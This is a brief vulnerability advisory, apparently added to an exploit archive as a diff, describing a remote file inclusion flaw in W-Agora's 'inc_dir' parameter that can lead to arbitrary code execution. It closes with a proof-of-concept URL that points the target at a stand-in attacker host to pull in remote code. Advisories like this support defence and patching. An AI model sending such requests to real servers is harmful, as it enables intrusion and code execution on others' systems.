@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/4977/info
+
+W-Agora is prone to an issue which may allow an attacker to include arbitrary files located on a remote server. In particular, the 'inc_dir' variable found in a number of the W-Agora scripts defines the path to the configuration file. It is possible, under some configurations, for an attacker to specify an arbitrary value for the location of the configuration file which points to a file on a remote server.
+
+If the included file is a PHP script, this may allow for execution of arbitrary attacker-supplied code.
+
+http://[target]/include/oci8.php?inc_dir=http://www.attacker.com&ext=txt 
